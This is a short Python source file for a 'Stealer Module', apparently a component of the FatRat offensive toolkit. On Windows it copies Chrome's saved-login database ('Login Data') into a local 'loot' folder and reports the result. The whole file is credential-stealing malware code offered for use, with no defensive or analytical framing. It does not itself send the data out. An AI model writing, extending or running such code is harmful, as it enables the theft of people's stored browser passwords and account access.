#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Stealer Module - Extracts passwords and browser data
Compatible with FatRat and other modules
"""
import os
import shutil

class Stealer:
    def __init__(self, output_dir=None):
        self.output_dir = output_dir or os.path.join(os.path.dirname(__file__), '..', 'results', 'loot')
        os.makedirs(self.output_dir, exist_ok=True)

    def steal_chrome(self):
        if os.name == 'nt':
            src = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
            dst = os.path.join(self.output_dir, 'chrome_login_data')
            try:
                shutil.copy(src, dst)
                return f"Chrome login data copied to {dst}"
            except Exception as e:
                return f"Error: {e}"
        return "Not supported on this OS."

if __name__ == "__main__":
    s = Stealer()
    print(s.steal_chrome())
